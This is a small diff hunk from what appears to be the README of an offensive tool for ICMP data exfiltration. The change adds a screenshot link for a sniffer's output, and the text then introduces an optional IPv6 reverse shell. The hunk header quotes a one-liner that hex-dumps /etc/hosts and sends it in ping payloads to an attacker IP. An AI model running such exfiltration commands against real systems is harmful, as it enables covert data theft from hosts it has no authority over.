@@ -29,6 +29,7 @@ xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line <attacker_ip>; d
 #### 3️⃣ Example Output
 Below is an example screenshot of the sniffer capturing data sent over ICMP:
 
+![ICMP Sniffer Output](Images/Icmp_sniffer_usage.PNG)
 
 #### 🌐 Optional: Reverse Shell over IPv6
 If the target supports IPv6, you can establish a reverse shell:
